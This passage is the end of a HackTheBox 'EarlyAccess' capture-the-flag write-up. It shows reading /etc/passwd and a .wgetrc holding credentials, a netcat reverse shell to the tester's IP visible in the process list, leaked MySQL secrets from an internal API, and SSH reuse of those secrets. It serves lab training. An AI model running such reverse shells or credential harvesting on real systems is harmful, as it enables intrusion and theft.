</span></span></code></pre></div><p>And we will have a reverse shell!</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ cat /etc/passwd | grep bash
</span></span><span style="display:flex"><span>cat /etc/passwd | grep bash
</span></span><span style="display:flex"><span>root❌0:0:root:/root:/bin/bash
</span></span><span style="display:flex"><span>www-adm❌1000:1000::/home/www-adm:/bin/bash
</span></span></code></pre></div><h1 id="getting-the-user-flag">Getting the user flag<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-user-flag">#</a></h1><p>We can change to user <code>www-adm</code> using the admin password (<code>gameover</code>).
In its home:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-adm@webserver:~$ cat .wetrc
</span></span><span style="display:flex"><span>cat .wgetrc
</span></span><span style="display:flex"><span>user<span style="color:#f92672">=</span>api
</span></span><span style="display:flex"><span>password<span style="color:#f92672">=</span>s3CuR3_API_PW!
</span></span></code></pre></div><p>But it seems like we are not in the user yet…</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-adm@webserver:/var/www/html$ cat /etc/cron.daily/passwd
</span></span><span style="display:flex"><span>cat /etc/cron.daily/passwd
</span></span><span style="display:flex"><span><span style="color:#75715e">#!/bin/sh</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>cd /var/backups <span style="color:#f92672">||</span> exit <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">for</span> FILE in passwd group shadow gshadow; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex"><span>        test -f /etc/$FILE              <span style="color:#f92672">||</span> <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex"><span>        cmp -s $FILE.bak /etc/$FILE     <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex"><span>        cp -p /etc/$FILE $FILE.bak <span style="color:#f92672">&amp;&amp;</span> chmod <span style="color:#ae81ff">600</span> $FILE.bak
</span></span><span style="display:flex"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-adm@webserver:/var/www/html/routes$ ps -e -o command
</span></span><span style="display:flex"><span>ps -e -o command
</span></span><span style="display:flex"><span>COMMAND
</span></span><span style="display:flex"><span>/bin/sh -c /root/entry.sh
</span></span><span style="display:flex"><span>/bin/sh /root/entry.sh
</span></span><span style="display:flex"><span>/usr/sbin/cron
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>sh -c nc 10.10.14.81 <span style="color:#ae81ff">6666</span> -e /bin/bash
</span></span><span style="display:flex"><span>bash
</span></span><span style="display:flex"><span>python3 -c import pty; pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>/bin/bash
</span></span><span style="display:flex"><span>su www-adm
</span></span><span style="display:flex"><span>bash
</span></span><span style="display:flex"><span>apache2 -DFOREGROUND
</span></span><span style="display:flex"><span>ps -e -o command
</span></span></code></pre></div><p>Okay, so the <code>api</code> service is not running in this machine. Also, we are not
able to use any network tools so we might be in a minimal system, such
as a container.</p><p>We can check if we are inside a container like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-adm@webserver:/var/www/html/routes$ cat /proc/self/cgroup
</span></span><span style="display:flex"><span>cat /proc/self/cgroup
</span></span><span style="display:flex"><span>11:cpuset:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>10:pids:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>9:memory:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>8:cpu,cpuacct:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>7:blkio:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>6:net_cls,net_prio:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>5:perf_event:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>4:freezer:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>3:devices:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>2:rdma:/
</span></span><span style="display:flex"><span>1:name<span style="color:#f92672">=</span>systemd:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c
</span></span><span style="display:flex"><span>0::/system.slice/containerd.service
</span></span></code></pre></div><p>And we indeed are.</p><p>If we check <code>/etc/hosts</code>, we see an entry for the <code>webserver</code>. So the
API might be called <code>api</code> or <code>apiserver</code>?</p><p>We can wget to <code>api</code> and the name will be resolved by Docker DNS:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>wget api:5000
</span></span></code></pre></div><p>We get the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span>{<span style="color:#e6db74">&#34;message&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Welcome to the game-key verification API! You can verify your keys via: /verify/&lt;game-key&gt;. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.&#34;</span>,<span style="color:#e6db74">&#34;status&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">200</span>}
</span></span></code></pre></div><p>By using the <code>check_db</code> endpoint, we can see the logs of the
database. There is an interesting part, where some credentials are
stored:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span><span style="color:#e6db74">&#34;Env&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;MYSQL_DATABASE=db&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;MYSQL_USER=drew&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;MYSQL_PASSWORD=drew&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;SERVICE_TAGS=dev&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;SERVICE_NAME=mysql&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;GOSU_VERSION=1.12&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;MYSQL_MAJOR=8.0&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;MYSQL_VERSION=8.0.25-1debian10&#34;</span>
</span></span><span style="display:flex"><span>]<span style="color:#960050;background-color:#1e0010">,</span>
</span></span></code></pre></div><p>As we saw before in the original page, <code>drew</code> has email
<code>draw@earlyaccess.htb</code>, so he might be a user of the system. We can try
the usernames and passwords we got by now to try to get into the ssh.</p><p>And we can login with <code>drew:XeoNu86JTznxMCQuGHrGutF3Csq5</code> to the ssh
endpoint. And now we can get the <strong>user flag</strong>! God it has been a really
long path.</p></div><footer class="post-footer"><ul class="post-tags"><li><a href="https://xzebra.dev/tags/cybersecurity/">cybersecurity</a></li><li><a href="https://xzebra.dev/tags/ctf/">ctf</a></li><li><a href="https://xzebra.dev/tags/linux/">linux</a></li><li><a href="https://xzebra.dev/tags/hackthebox/">hackthebox</a></li></ul><div class="share-buttons"><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: EarlyAccess on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Writeup%3a%20EarlyAccess&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_earlyaccess%2f&amp;hashtags=cybersecurity%2cctf%2clinux%2chackthebox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: EarlyAccess on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_earlyaccess%2f&amp;title=HackTheBox%20Writeup%3a%20EarlyAccess&amp;summary=HackTheBox%20Writeup%3a%20EarlyAccess&amp;source=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_earlyaccess%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: EarlyAccess on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_earlyaccess%2f&amp;title=HackTheBox%20Writeup%3a%20EarlyAccess"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: EarlyAccess on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_earlyaccess%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: EarlyAccess on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Writeup%3a%20EarlyAccess%20-%20https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_earlyaccess%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: EarlyAccess on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Writeup%3a%20EarlyAccess&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_earlyaccess%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"></path></svg></a></div></footer></article></main><a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"></path></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>